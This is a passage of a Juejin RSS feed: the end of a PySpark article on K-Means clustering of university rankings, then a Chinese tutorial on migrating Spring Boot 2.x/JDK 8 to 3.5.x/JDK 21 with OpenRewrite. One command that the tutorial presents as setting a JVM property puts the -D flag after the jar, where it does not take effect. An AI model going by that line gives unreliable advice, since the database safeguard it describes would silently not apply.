    result_df = university_count_df.join(top_100_count_df, <span class="hljs-string">"Location"</span>, <span class="hljs-string">"left_outer"</span>).join(average_score_df, <span class="hljs-string">"Location"</span>, <span class="hljs-string">"left_outer"</span>)
    <span class="hljs-comment"># 5. 对空值进行处理，并将结果按照TOP100数量进行降序排列</span>
    final_result_df = result_df.fillna(<span class="hljs-number">0</span>, subset=[<span class="hljs-string">"top_100_count"</span>, <span class="hljs-string">"average_score"</span>]).orderBy(F.desc(<span class="hljs-string">"top_100_count"</span>))
    <span class="hljs-keyword">return</span> final_result_df

<span class="hljs-comment"># 功能三：基于K-Means算法的大学聚类分析</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">perform_university_clustering</span>(<span class="hljs-params">cleaned_df, k=<span class="hljs-number">4</span></span>):
    <span class="hljs-comment"># 选择用于聚类的特征列</span>
    feature_cols = [<span class="hljs-string">'Overall Teaching Score'</span>, <span class="hljs-string">'Research Score'</span>, <span class="hljs-string">'Research Quality'</span>, <span class="hljs-string">'Industry Income Score'</span>, <span class="hljs-string">'International Outlook Score'</span>]
    <span class="hljs-comment"># 步骤1: 使用VectorAssembler将多个特征列合并成一个单一的“features”向量列</span>
    assembler = VectorAssembler(inputCols=feature_cols, outputCol=<span class="hljs-string">"features_vec"</span>)
    <span class="hljs-comment"># 步骤2: 使用StandardScaler对特征向量进行标准化，消除量纲影响</span>
    scaler = StandardScaler(inputCol=<span class="hljs-string">"features_vec"</span>, outputCol=<span class="hljs-string">"scaled_features"</span>, withStd=<span class="hljs-literal">True</span>, withMean=<span class="hljs-literal">True</span>)
    <span class="hljs-comment"># 步骤3: 创建并配置K-Means模型</span>
    kmeans = KMeans(featuresCol=<span class="hljs-string">"scaled_features"</span>, predictionCol=<span class="hljs-string">"cluster"</span>, k=k, seed=<span class="hljs-number">42</span>)
    <span class="hljs-comment"># 步骤4: 构建一个Pipeline来串联Assembler、Scaler和K-Means</span>
    pipeline = Pipeline(stages=[assembler, scaler, kmeans])
    <span class="hljs-comment"># 步骤5: 使用清洗后的数据来训练Pipeline模型</span>
    model = pipeline.fit(cleaned_df)
    <span class="hljs-comment"># 步骤6: 使用训练好的模型对数据进行转换，得到带有聚类标签的结果</span>
    clustered_df = model.transform(cleaned_df)
    <span class="hljs-comment"># 步骤7: 为结果选择并重命名一些关键列，使其更易于理解</span>
    result_df = clustered_df.select(<span class="hljs-string">"University"</span>, <span class="hljs-string">"Location"</span>, <span class="hljs-string">"Overall Score"</span>, <span class="hljs-string">"cluster"</span>)
    <span class="hljs-keyword">return</span> result_df
</code></pre>
<h2 data-id="heading-6">基于大数据的全球大学排名数据可视化分析系统-结语</h2>
<blockquote>
<p>👇🏻 精彩专栏推荐订阅 👇🏻 不然下次找不到哟~</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754938.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754938.html" ref="nofollow noopener noreferrer">Java实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754940.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754940.html" ref="nofollow noopener noreferrer">Python实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754945.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754945.html" ref="nofollow noopener noreferrer">微信小程序|安卓实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754947.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754947.html" ref="nofollow noopener noreferrer">大数据实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754949.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754949.html" ref="nofollow noopener noreferrer">PHP|C#.NET|Golang实战项目</a></p>
<p>🍅 主页获取源码联系🍅</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 Spring Boot 2.x 到 3.5.x + JDK21：一次完整的生产环境迁移实战]]></title>    <link>https://juejin.cn/post/7580310413754138674</link>    <guid>https://juejin.cn/post/7580310413754138674</guid>    <pubDate>2025-12-06T13:38:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580310413754138674" data-draft-id="7580270531470426158" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Spring Boot 2.x 到 3.5.x + JDK21：一次完整的生产环境迁移实战"/> <meta itemprop="keywords" content="后端,Java,Spring Boot"/> <meta itemprop="datePublished" content="2025-12-06T13:38:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RainbowSea"/> <meta itemprop="url" content="https://juejin.cn/user/752533564566951"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Spring Boot 2.x 到 3.5.x + JDK21：一次完整的生产环境迁移实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/752533564566951/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RainbowSea
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T13:38:01.000Z" title="Sat Dec 06 2025 13:38:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="darcula">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#bababa}.hljs-emphasis,.hljs-strong{color:#a8a8a2}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#6896ba}.hljs-code,.hljs-selector-class{color:#a6e22e}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#cb7832}.hljs-params{color:#b9b9b9}.hljs-string{color:#6a8759}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable,.hljs-type{color:#e0c46c}.hljs-comment,.hljs-deletion,.hljs-meta{color:#7f7f7f}</style><h2 data-id="heading-0">从 Spring Boot 2.x 到 3.5.x + JDK21：一次完整的生产环境迁移实战</h2>
<p>@[toc]</p>
<h2 data-id="heading-1">升级背景</h2>
<p>在私有化部署过程中，客户使用安全扫描工具检测到大量安全漏洞，主要集中在： </p>
<ul>
<li><strong>框架版本过低</strong>：Spring Boot 2.1.6.RELEASE（发布于 2019 年） </li>
<li><strong>JDK 版本过旧</strong>：JDK 8（缺乏最新安全补丁） </li>
<li><strong>第三方依赖</strong>：多个依赖存在已知 CVE 漏洞 </li>
</ul>
<p>基于安全合规和长期维护的考虑，决定进行大版本升级。 </p>
<ul>
<li><strong>当前版本</strong>：Spring Boot 2.1.6.RELEASE + JDK 8 </li>
<li><strong>目标版本</strong>：<strong>Spring Boot 3.5.4 + JDK 21 LTS</strong></li>
</ul>
<h2 data-id="heading-2">升级目标与核心变化</h2>
<p><strong>主要变化</strong></p>



































<table><thead><tr><th align="left"><strong>类别</strong></th><th align="left"><strong>变化内容</strong></th><th align="left"><strong>迁移方式</strong></th></tr></thead><tbody><tr><td align="left"><strong>命名空间</strong></td><td align="left">javax.* → jakarta.*</td><td align="left">自动化迁移</td></tr><tr><td align="left"><strong>JDK 版本</strong></td><td align="left">Java 8 → Java 21 LTS</td><td align="left">自动化迁移 + 手动调整</td></tr><tr><td align="left"><strong>第三方依赖</strong></td><td align="left">大量依赖需要升级</td><td align="left">手动处理</td></tr><tr><td align="left"><strong>API 文档</strong></td><td align="left">Swagger 2.x → SpringDoc OpenAPI 3.x</td><td align="left">配置调整</td></tr><tr><td align="left"><strong>安全配置</strong></td><td align="left">WebSecurityConfigurerAdapter 废弃</td><td align="left">重写配置类</td></tr></tbody></table>
<p><strong>为什么选择自动化迁移？</strong>\ 前两项（命名空间和 JDK 版本）涉及的代码改动量极大，手动修改容易出错且效率低下。</p>
<p><strong>OpenRewrite </strong>作为业界成熟的自动化重构工具，可以完成大部分繁琐工作。</p>
<h2 data-id="heading-3">完整升级步骤</h2>
<h3 data-id="heading-4">第一阶段：准备工作（JDK 8 环境）</h3>
<h4 data-id="heading-5">代码分支管理</h4>
<p><strong/></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">确保主分支代码为最新</span>
git checkout dev
git pull origin dev
<span class="hljs-meta prompt_">

# </span><span class="bash">创建升级专用分支</span>
git checkout -b upgrade/springboot3-jdk21
</code></pre>
<h4 data-id="heading-6">引入 OpenRewrite Maven 插件</h4>
<p><strong/></p>
<p><strong>什么是 OpenRewrite？ </strong></p>
<p>OpenRewrite 是一个自动化代码重构和迁移工具，专为 Java 生态系统设计。 </p>
<p><strong>核心优势</strong>： </p>
<ol>
<li><strong>精确安全</strong>：在 AST（抽象语法树）层面操作，不会破坏代码结构 </li>
<li> <strong>批量处理</strong>：一次性处理整个代码库 </li>
<li><strong>可预览</strong>：使用 <code>rewrite:dryRun</code> 查看变更预览 </li>
<li><strong>可定制</strong>：支持声明式（YAML）或编程式自定义规则</li>
</ol>
<p><strong>工作原理</strong>： </p>
<p>OpenRewrite 通过解析源代码生成无损语法树（LST），在 AST 层面进行精确转换，完整保留： </p>
<ul>
<li>原始格式和缩进 </li>
<li>所有注释 </li>
<li>代码风格</li>
</ul>
<p><strong>配置方式</strong>：</p>
<p>在 <code>pom.xml</code> 的 <code>&lt;plugins&gt;</code> 节点下添加：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.openrewrite.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rewrite-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.15.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">exportDatatables</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">exportDatatables</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">activeRecipes</span>&gt;</span>
                <span class="hljs-comment">&lt;!-- 升级到 Java 21 --&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">recipe</span>&gt;</span>org.openrewrite.java.migrate.UpgradeToJava21<span class="hljs-tag">&lt;/<span class="hljs-name">recipe</span>&gt;</span>
                <span class="hljs-comment">&lt;!-- JUnit 4 to 5 --&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">recipe</span>&gt;</span>org.openrewrite.java.spring.boot2.SpringBoot2JUnit4to5Migration<span class="hljs-tag">&lt;/<span class="hljs-name">recipe</span>&gt;</span>
                <span class="hljs-comment">&lt;!-- Spring Boot 3.4（插件暂不支持 3.5，升级后手动改） --&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">recipe</span>&gt;</span>org.openrewrite.java.spring.boot3.UpgradeSpringBoot_3_4<span class="hljs-tag">&lt;/<span class="hljs-name">recipe</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">activeRecipes</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.openrewrite.recipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rewrite-migrate-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.openrewrite.recipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rewrite-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.11.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
</code></pre>
<p><strong>配方（Recipe）说明</strong>：</p>
<ul>
<li><code>UpgradeSpringBoot_3_4 ：</code>升级至 Spring Boot 3.4.x（插件暂不支持 3.5，升级后手动修改版本号即可） </li>
<li><code>UpgradeToJava21 ：</code> 升级至 JDK 21（Spring Boot 配方仅升级到 JDK 17，需额外添加此配方） </li>
<li><code>SpringBoot2JUnit4to5Migration ：</code>升级测试框架，避免自动化测试报错</li>
</ul>
<blockquote>
<p><em><strong>提示</strong>：你也可以编写自定义配方来处理项目特定的迁移需求。</em></p>
</blockquote>
<p><em/></p>
<h4 data-id="heading-7">执行自动化迁移</h4>
<p><strong/></p>
<pre><code class="hljs language-shell" lang="shell">mvn rewrite:run
</code></pre>
<p>或者在 IDEA 中通过 Maven 面板执行：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/224c5180704c4ec6b2c8b7541b35d981~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=8awFO6tSxFePOHgoUeJs1h34bZM%3D" alt="" loading="lazy"/></p>
<p><strong>执行时间：</strong> 几分钟到几十分钟不等，取决于项目规模。</p>
<p><strong>可能遇到的问题：</strong></p>
<ol>
<li>如果某些类包含特殊代码导致报错，可以先注释掉，待升级完成后再处理</li>
<li>执行完成后可以删除该插件（也可以保留，以便后续增量升级）</li>
</ol>
<h4 data-id="heading-8">OpenRewrite 自动完成的变更</h4>
<p>执行完成后，主要变化包括：</p>
<p><strong>依赖升级</strong>： </p>
<ul>
<li><code>pom.xml</code>  中的依赖版本自动升级 </li>
<li>Spring Boot 版本升级到 3.4.x（手动改为 3.5.4）</li>
</ul>
<p><strong>包名变更</strong>：</p>
<ul>
<li><code>javax.servlet.* → jakarta.servlet.*</code></li>
<li><code>javax.persistence.* → jakarta.persistence.* </code></li>
<li><code>javax.validation.* → jakarta.validation.*</code></li>
</ul>
<p><strong>API 文档迁移</strong>：</p>
<ul>
<li>Swagger 2.x → SpringDoc OpenAPI 3.x</li>
</ul>
<p/>
<p><strong>JDK 新特性应用</strong>：</p>
<ul>
<li><strong>Text Blocks</strong>：多行字符串的优雅处理</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 自动转换为</span>
<span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">"""
 {
 "name": "user",
 "age": 18
 }
 """</span>;
</code></pre>
<ul>
<li><strong>instanceof 模式匹配</strong>：简化类型判断和转换</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> String s) {
	 System.out.println(s.toUpperCase());
}
</code></pre>
<ul>
<li><strong>String.formatted()：</strong> 替代 <code>String.format()</code></li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-string">"Hello, %s!"</span>.formatted(name);
</code></pre>
<ul>
<li><strong>集合增强</strong>： getFirst() 替代 get(0)</li>
<li><strong>@Serial</strong> 注解：标记序列化相关字段</li>
</ul>
<p/>
<p><strong>第三方库升级</strong>： </p>
<ul>
<li>Apache HttpClient </li>
<li>Apache Commons 系列 </li>
<li>其他常用工具库</li>
</ul>
<p/>
<h4 data-id="heading-9">增量合并场景处理</h4>
<p><strong>场景：</strong> 执行 Rewrite 后，旧分支又有代码提交，合并时出现大量 <code>javax</code> 包名和 Swagger 注解冲突。</p>
<p><strong>解决方案</strong>：使用 IntelliJ IDEA 自带的 Refactor 功能（本质也是基于 OpenRewrite）</p>
<p>操作步骤：</p>
<ol>
<li>打开 IDEA，选择 <code>Refactor → Migrate Packages and Classes </code></li>
<li>选择迁移规则（javax → jakarta） </li>
<li>预览变更并执行</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f9f8a046a9f4d5bb3651ea4b8e0b9ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=Lf2blUIbVBYlD9iOkdykDBvfUGk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe3555b974b349c1b11d46d6df560d1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=DLEsyvmlp9J7b%2Fsb%2FNyqR0l%2BTWE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">第二阶段：环境切换（JDK 21 环境）</h3>
<blockquote>
<p><strong>重要分界线：以下操作需在 JDK 21 环境下进行。</strong></p>
</blockquote>
<hr/>
<h4 data-id="heading-11">6. 修改 IDEA 项目配置</h4>
<p><strong>修改 SDK 和 Language Level（快捷键：Ctrl + Alt + Shift + S）：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c59de59d458d49cf9f81ac2106903c7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=D0z45B6qk81lc67rPfT5NuudMlQ%3D" alt="" loading="lazy"/></p>
<p><strong>修改 Modules 的 Language Level：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f0a71baef754c1f965f8fc168b3b527~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=kUAd%2Fdwmd%2B%2B3NdzXadWBsoUua9Y%3D" alt="" loading="lazy"/></p>
<p><strong>修改 Java Compiler（快捷键：Ctrl + Alt + S）：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cba430b48fe24113a92e63a690a2f95a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=pYSQfEpCs1wzchwcwCD8bQBnSeo%3D" alt="" loading="lazy"/></p>
<hr/>
<hr/>
<hr/>
<h2 data-id="heading-12">核心问题与解决方案</h2>
<h3 data-id="heading-13">问题一：Hibernate DDL Auto 的陷阱</h3>
<blockquote>
<p><strong>严重警告：在完成以下配置前，切勿启动项目！否则可能导致数据库结构被错误修改。</strong></p>
</blockquote>
<hr/>
<p><strong>问题背景</strong></p>
<p>新旧版本 Hibernate 的行为差异：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caff1acd509a48b68297e782b1fd8d9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633080&amp;x-signature=wDiwtanzB%2FVTO6GfM6p0IS99N%2FI%3D" alt="" loading="lazy"/></p>
<p><strong>为什么要禁用？</strong></p>
<p>在生产环境中使用 <code>spring.jpa.hibernate.ddl-auto=update</code> 存在严重风险：</p>
<ol>
<li><strong>数据安全风险</strong>：自动更新可能导致意外的数据丢失或结构变更 </li>
<li><strong>性能问题</strong>：启动时全表检查会显著增加应用启动时间 </li>
<li><strong>版本控制缺失</strong>：无法追踪数据库变更历史，不利于团队协作和回滚 </li>
<li><strong>升级后风险更高</strong>：Hibernate 6.x 的校验更严格，误操作概率增加</li>
</ol>
<p><strong/></p>
<h4 data-id="heading-14">解决方案</h4>
<p><strong>方案一：配置优先级控制（推荐）</strong></p>
<p>在 CI/CD 启动脚本中设置 VM 参数：</p>
<pre><code class="hljs language-shell" lang="shell">java -jar app.jar -Dspring.jpa.hibernate.ddl-auto=none
</code></pre>
<p><strong>优先级</strong>：VM 参数 &gt; 配置中心（Apollo/Nacos） &gt; application.properties</p>
<p><strong>方案二：使用专业的数据库版本管理工具</strong></p>
<p>推荐使用 <strong>Flyway</strong> 或 <strong>Liquibase</strong> 管理数据库脚本：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.flywaydb<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flyway-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>方案三：结构对比工具</strong></p>
<ul>
<li><strong>Navicat</strong>：提供结构同步功能 </li>
<li><strong>DataGrip</strong>：IntelliJ 系产品，支持数据库结构对比</li>
</ul>
<p/>
<h3 data-id="heading-15"><strong>问题二：Spring Security 配置迁移</strong></h3>
<p><strong>核心变化</strong></p>
<ul>
<li><code>WebSecurityConfigurerAdapter</code> 已废弃</li>
<li>推荐使用 <strong>Lambda DSL</strong> 配置方式 </li>
<li>配置方式从继承改为 Bean 注册</li>
</ul>
<p><strong>迁移示例</strong></p>
<p><strong>旧版配置</strong>（Spring Security 5.x）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
        http
                .csrf().disable()
                .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                .and()
                .authorizeRequests()
                .antMatchers(<span class="hljs-string">"/api/public/**"</span>).permitAll()
                .anyRequest().authenticated();
    }
}
</code></pre>
<p><strong>新版配置</strong>（Spring Security 6.x）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TokenProvider tokenProvider;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SecurityConfig</span><span class="hljs-params">(TokenProvider tokenProvider)</span> {
